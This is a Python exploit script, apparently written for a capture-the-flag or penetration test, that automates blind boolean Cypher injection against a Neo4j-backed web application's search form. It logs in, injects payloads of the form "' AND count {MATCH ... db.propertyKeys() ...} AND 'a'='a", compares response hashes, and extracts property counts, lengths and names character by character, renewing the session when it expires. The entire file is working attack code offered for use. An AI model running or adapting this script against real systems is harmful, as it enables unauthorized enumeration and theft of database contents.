import requests,argparse
from Login import Login
from hashlib import sha256
charset='abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'+"'"+'()*+,-./:;<=>?@[\]^`{|}~ '
total_label = 0
label_names = []

args = argparse.ArgumentParser()

args.add_argument('-U','--url',required=True,type=str)
args.add_argument('-u','--username',default='',type=str,required=True)
args.add_argument('-p','--password',default='',type=str,required=True)
args.add_argument('-l','--labels',nargs='+',required=True)
opt = args.parse_args()

session , page_hash = Login(opt.username,opt.password,opt.url)





def GetPropertiesNumber(url,labelName):
    global session,page_hash
    payload = ''
    num = 1
    while True:
        try:
            print(f"[!]Guessing Number Of Properites... using Number {num}")
            payload = "' AND count {MATCH(t:%s) CALL db.propertyKeys() YIELD propertyKey WITH propertyKey WHERE not isEmpty(t[propertyKey]) WITH distinct propertyKey RETURN propertyKey} = %d AND 'a'='a"%(labelName,num)
            req = requests.post(url+'/search',data={'search':payload},cookies={'session':session,'lang':'en-US'})
            if req.ok:
                if sha256(req.content).hexdigest() != page_hash:
                    return num
                else:
                    num += 1
            else:
                if req.status_code >= 300 and req.status_code <400:
                    print("[!]Session Expired.Renewing...")
                    session , page_hash = Login(opt.username,opt.password,opt.url)
                    continue
                else:
                    return -1

        except Exception as Err:
            print(str(Err))
            return -1
        


def GetPropertiesNameSize(url,total,LabelName):
    global session,page_hash
    payload = ''
    size = 0
    szList = []
    search = True
    index = 0
    while index < total:
        while search != False:
            try:
                print(f"Guesing For index: {index} ... using size: {size}")
                payload = "' AND exists {match(t:%s) call db.propertyKeys() yield propertyKey with propertyKey  where not isEmpty(t[propertyKey]) with distinct propertyKey skip %d limit 1 where size(propertyKey) = %d return propertyKey} AND 'a'='a"%(LabelName,index,size)
                req = requests.post(url+'/search',data={'search':payload},cookies={'session':session,'lang':'en-US'})
                if req.ok:
                    if sha256(req.content).hexdigest() != page_hash:
                        szList.append(size)
                        search = False
                    else:
                        #print(f"status {req.status_code}")
                        size += 1
                else:
                    if req.status_code >= 300 and req.status_code <400:
                        print("[!]Session Expired.Renewing...")
                        session , page_hash = Login(opt.username,opt.password,opt.url)
                        continue
                    else:
                        return szList

            except Exception as Err:
                print(str(Err))
                return szList
            
        search = True
        index += 1
        size = 0
        
    return szList



def DumpProperties(url,rowIndex,labelSize,label):
    global session,page_hash
    payload = ''
    labelName =''
    search = True
    strIndex = 0
    index = 0
    while strIndex < labelSize:
        while search != False:
            try:
                while index < len(charset):
                    character = charset[index]
                    if character == "'":
                        character = "\'"
                    
                    print(f"Guesing For Label Name {label} For index: {strIndex}... using {character} ")
                    
                    payload = "' and exists { match(t:%s) call db.propertyKeys() yield propertyKey with propertyKey where not isEmpty(t[propertyKey]) with distinct propertyKey skip %d limit 1 where substring(propertyKey,%d,1)='%c' return propertyKey} and 'a'='a"%(label,rowIndex,strIndex,character)
                    req = requests.post(url+'/search',data={'search':payload},cookies={'session':session,'lang':'en-US'})
                    if req.ok:
                        if sha256(req.content).hexdigest() != page_hash:
                            labelName += f'{character}'
                            print(f"[+]Found : RowIndex: {rowIndex} strIndex: {strIndex} - {character}")
                            search = False
                            break
                        else:
                            index += 1
                    else:
                        if req.status_code >= 300 and req.status_code <400:
                            print("\n[!]Session Expired.Renewing...")
                            session , page_hash = Login(opt.username,opt.password,opt.url)
                            print(labelName)
                            continue
                        else:
                            return ''

            except Exception as Err:
                print(str(Err))
                return ''
            
        search = True
        strIndex += 1
        index = 0
    
    return labelName


# labels = GetLabelNumber(opt.url)
# if labels == -1:
#     print("Unable TO Find Label Names")
#     exit(0)




# print(f"Total Labels : {labels}")

# nameSizes = GetLabelNameSize(opt.url,labels)

# if nameSizes != -1:
#     if len(nameSizes) == 0:
#         print("Unable TO Find Label Name size")
#         exit(0)

# print(nameSizes)

# LabelNames = []
# for index in range(labels):
#     LabelNames.append(DumpLabel(opt.url,index,nameSizes[index]))

# print(LabelNames)

result ={}

for label in opt.labels:
    n = GetPropertiesNumber(opt.url,label)
    if n == -1:
        print("Unable TO Find Label Names")
        exit(0)
    print(f"Total properties in label {label}: {n}")

    proplist = GetPropertiesNameSize(opt.url,n,label)
    if len(proplist) == 0:
        print("Unable TO Find properties Name size")
        exit(0)
    print(proplist)
    result[label]=[]
    for row in range(n):
        prop = DumpProperties(opt.url,row,proplist[row],label)
        result[label].append(prop)
        print(prop)

    print(result)